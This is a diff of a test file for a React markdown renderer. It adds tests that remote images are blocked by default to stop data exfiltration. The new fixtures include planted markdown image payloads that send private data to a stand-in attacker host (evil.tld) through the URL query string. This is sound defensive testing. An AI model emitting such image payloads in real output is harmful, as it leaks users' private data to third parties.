@@ -106,12 +106,13 @@ describe('MarkdownRenderer — image resolver seam', () => {
     expect(screen.getByText(/Imagem indisponível/)).toBeInTheDocument();
   });
 
-  it('does not call resolveImage for an already-absolute image URL', () => {
+  it('does not call resolveImage for an already-absolute image URL (remoteImages="allow")', () => {
     const resolveImage = vi.fn();
     render(
       <MarkdownRenderer
         content={'![Ext](https://example.com/pic.png)'}
         resolveImage={resolveImage}
+        remoteImages="allow"
       />,
     );
     expect(resolveImage).not.toHaveBeenCalled();
@@ -119,28 +120,41 @@ describe('MarkdownRenderer — image resolver seam', () => {
   });
 });
 
-describe('MarkdownRenderer — link navigation seam', () => {
-  it('calls onNavigate (and prevents default) for a relative doc link', async () => {
-    const onNavigate = vi.fn();
-    const user = userEvent.setup();
-    render(<MarkdownRenderer content={'[IA](05-information-architecture.md)'} onNavigate={onNavigate} />);
-    await user.click(screen.getByText('IA'));
-    expect(onNavigate).toHaveBeenCalledWith('05-information-architecture.md');
+describe('MarkdownRenderer — remote images blocked by default (exfiltration)', () => {
+  const planted = [
+    '![bio](https://evil.tld/?d=private-brand-data)',
+    '![bio](//evil.tld/?d=private-brand-data)',
+    '![bio](data:image/png;base64,AAAA)',
+  ];
+  for (const md of planted) {
+    for (const mode of [undefined, 'block' as const]) {
+      it(`never emits a remote <img> for ${md.slice(0, 30)} (mode=${String(mode)})`, () => {
+        const { container } = render(<MarkdownRenderer content={md} remoteImages={mode} />);
+        expect(container.querySelector('img')).toBeNull();
+        expect(container.innerHTML).not.toContain('evil.tld');
+        expect(screen.getByText(/bio/)).toBeInTheDocument();
+      });
+    }
+  }
+
+  it('still renders a relative image through resolveImage when blocking', () => {
+    render(
+      <MarkdownRenderer
+        content={'![Logo](logo.png)'}
+        resolveImage={(s) => `/resolved/${s}`}
+        remoteImages="block"
+      />,
+    );
+    expect((screen.getByAltText('Logo') as HTMLImageElement).src).toContain('/resolved/logo.png');
   });
 
-  it('opens an absolute http(s) link in a new tab, never through onNavigate', () => {
-    const onNavigate = vi.fn();
-    render(<MarkdownRenderer content={'[Linear](https://linear.app)'} onNavigate={onNavigate} />);
-    const link = screen.getByText('Linear').closest('a');
-    expect(link).toHaveAttribute('target', '_blank');
-    expect(link).toHaveAttribute('rel', expect.stringContaining('noopener'));
-  });
-
-  it('leaves a bare #hash link native (no onNavigate call)', () => {
-    const onNavigate = vi.fn();
-    render(<MarkdownRenderer content={'[Voltar ao topo](#visao-geral)'} onNavigate={onNavigate} />);
-    const link = screen.getByText('Voltar ao topo').closest('a');
-    expect(link).toHaveAttribute('href', '#visao-geral');
-    expect(onNavigate).not.toHaveBeenCalled();
+  it('trusts a host-resolved URL for a relative src', () => {
+    render(
+      <MarkdownRenderer
+        content={'![Logo](logo.png)'}
+        resolveImage={() => 'https://cdn.host/logo.png'}
+      />,
+    );
+    expect(screen.getByAltText('Logo')).toBeInTheDocument();
   });
 });
